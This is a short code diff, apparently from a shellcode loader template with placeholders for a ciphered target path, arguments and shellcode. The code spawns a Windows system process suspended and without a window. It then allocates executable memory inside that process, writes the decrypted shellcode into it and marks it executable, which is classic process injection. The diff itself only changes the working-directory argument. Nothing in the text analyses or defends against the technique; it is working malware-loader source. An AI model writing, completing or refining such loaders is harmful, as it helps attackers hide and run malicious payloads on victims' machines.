@@ -32,7 +32,7 @@ int main(int argc, char** argv) {
 	GetWindowsDirectory(windir, MAX_PATH);
 	sprintf(injectpath, cipher("#FORMAT1", #FORMAT1LENGTH), windir, cipher("#TARGET", #TARGETLENGTH));
 	sprintf(args, cipher("#FORMAT2", #FORMAT2LENGTH), injectpath, #ARGS);
-	CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);
+	CreateProcess(injectpath, args, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, windir, &s_info, &p_info);
 	NtAllocateVirtualMemory(p_info.hProcess, &apointer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	NtWriteVirtualMemory(p_info.hProcess, apointer, cipher("#SHELLCODE", #SHELLCODELENGTH), #SHELLCODELENGTH, NULL);
 	NtProtectVirtualMemory(p_info.hProcess, &apointer, &size, PAGE_EXECUTE_READ, NULL);
